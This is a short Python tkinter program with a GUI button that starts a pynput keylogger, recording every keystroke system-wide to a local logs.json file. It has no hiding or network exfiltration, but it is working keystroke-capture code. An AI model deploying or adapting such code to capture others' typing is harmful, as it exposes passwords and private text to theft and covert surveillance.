import tkinter as tk
from tkinter import *
from pynput import keyboard
import json
import threading

root = tk.Tk()
root.geometry("700x300")
root.title("Keylogger")

# Set the background image
background_image = PhotoImage(file="a.png")
background_label = Label(root, image=background_image)
background_label.place(x=0, y=0, relwidth=1, relheight=1)

key_list = []
x = False
key_strokes = ""

def update_json_file(key_list):
    with open('logs.json', 'w') as key_log:
        json.dump(key_list, key_log)

def on_press(key):
    global x, key_list
    if not x:
        key_list.append({'Pressed': f'{key}'})
    x = True
    if x:
        key_list.append({'Held': f'{key}'})
    update_json_file(key_list)

def on_release(key):
    global x, key_list, key_strokes
    key_list.append({'Released': f'{key}'})
    if x:
        x = False
    update_json_file(key_list)

def start_keylogger():
    print("[+] Keylogger started successfully!")
    print("[!] Saving the key logs in 'logs.json'")
    keylogger_thread = threading.Thread(target=run_keylogger)
    keylogger_thread.start()

def run_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def close_interface():
    root.destroy()

empty = Label(root, text=" ")
empty.grid(row=2, column=2)
empty = Label(root, text=" ")
empty.grid(row=4, column=4)
empty = Label(root, text=" ")
empty.grid(row=6, column=6)

description = Label(root, text="Keylogger", font='Verdana 20 bold', bg="lightblue")
description.grid(row=10, column=30)
empty = Label(root, text=" ")
empty.grid(row=12, column=12)
empty = Label(root, text=" ")
empty.grid(row=14, column=14)

start_button = Button(root, text="Start Keylogger", command=start_keylogger, bg="darkgreen", fg="white", font='Verdana 12')
start_button.grid(row=20, column=30, padx=20, pady=10)

empty = Label(root, text=" ")
empty.grid(row=22, column=34)

close_button = Button(root, text="Close", command=close_interface, bg="red", fg="white", font='Verdana 12')
close_button.grid(row=26, column=30, padx=20, pady=10)

root.mainloop()
